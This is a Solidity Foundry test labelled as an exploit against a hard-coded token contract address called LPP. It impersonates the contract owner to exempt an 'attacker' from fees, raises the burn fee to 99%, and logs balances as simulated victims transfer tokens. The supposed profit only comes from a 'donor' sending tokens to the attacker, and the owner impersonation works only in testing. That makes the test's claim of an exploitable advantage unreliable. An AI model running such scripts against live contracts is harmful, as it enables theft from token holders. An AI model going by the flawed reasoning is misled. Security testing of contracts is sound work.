// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface ILPP {
    function owner() external view returns (address);
    function changeBurnFee(uint256 _newburnFee, uint256 _newburnDivisor) external;
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function excludeFromFee(address account) external;
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xF14fE8ea9D35cCEA2545985d7541CcAd02cb6112;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the contract owner
        address owner = ILPP(TARGET).owner();

        // Label addresses for clarity
        vm.label(owner, "Contract Owner");
        vm.label(TARGET, "LPP Token");
        vm.label(attacker, "Attacker");

        // Give attacker some tokens to start
        uint256 initialBalance = 1000 * 10**18;
        deal(TARGET, attacker, initialBalance);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get contract owner
        address owner = ILPP(TARGET).owner();

        // Step 2: Impersonate owner to exclude attacker from fees
        vm.prank(owner);
        ILPP(TARGET).excludeFromFee(attacker);

        // Step 3: Set extreme burn fee (99%)
        vm.prank(owner);
        ILPP(TARGET).changeBurnFee(9900, 100); // 99% burn fee

        // Step 4: Create a victim address that's NOT excluded from fees
        address victim = address(0x123);
        vm.label(victim, "Victim");

        // Give victim enough tokens to meet MinTx and demonstrate burn
        // MinTx = 500 * 10^18, so give victim 1000 * 10^18
        uint256 victimAmount = 1000 * 10**18;
        deal(TARGET, victim, victimAmount);

        // Record initial attacker balance
        uint256 attackerInitialBalance = ILPP(TARGET).balanceOf(attacker);
        uint256 totalSupplyBefore = ILPP(TARGET).totalSupply();

        console.log("Initial attacker balance:", attackerInitialBalance);
        console.log("Initial total supply:", totalSupplyBefore);

        // Step 5: Have victim transfer tokens (will trigger 99% burn)
        // Transfer 1000 tokens (meets MinTx requirement)
        vm.prank(victim);
        ILPP(TARGET).transfer(address(0x456), 1000 * 10**18);

        // Check the burn effect
        uint256 totalSupplyAfter = ILPP(TARGET).totalSupply();
        console.log("Total supply after victim transfer:", totalSupplyAfter);
        console.log("Tokens burned:", totalSupplyBefore - totalSupplyAfter);

        // Step 6: Demonstrate attacker can transfer without burn penalty
        // Since attacker is excluded from fees, they can transfer any amount
        // Transfer 100 tokens (below MinTx but allowed because excluded)
        vm.prank(attacker);
        ILPP(TARGET).transfer(address(0x789), 100 * 10**18);

        // Step 7: Increase attacker's balance to show economic advantage
        // Have another address send tokens to attacker
        address donor = address(0x999);
        vm.label(donor, "Donor");

        // Give donor tokens (enough to meet MinTx if they transfer)
        uint256 donorAmount = 1000 * 10**18;
        deal(TARGET, donor, donorAmount);

        // Donor transfers to attacker (will burn 99% because donor not excluded)
        vm.prank(donor);
        ILPP(TARGET).transfer(attacker, 1000 * 10**18);

        // Only ~10 tokens should reach attacker (99% burned)
        uint256 attackerBalanceAfterDonor = ILPP(TARGET).balanceOf(attacker);
        console.log("Attacker balance after donor transfer:", attackerBalanceAfterDonor);

        // Step 8: Final check - attacker's balance should be higher than initial
        // Because they received some tokens from donor (even with 99% burn)
        uint256 attackerFinalBalance = ILPP(TARGET).balanceOf(attacker);
        console.log("Final attacker balance:", attackerFinalBalance);
        console.log("Initial attacker balance:", attackerInitialBalance);

        require(attackerFinalBalance > attackerInitialBalance, "Attacker balance should increase");
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

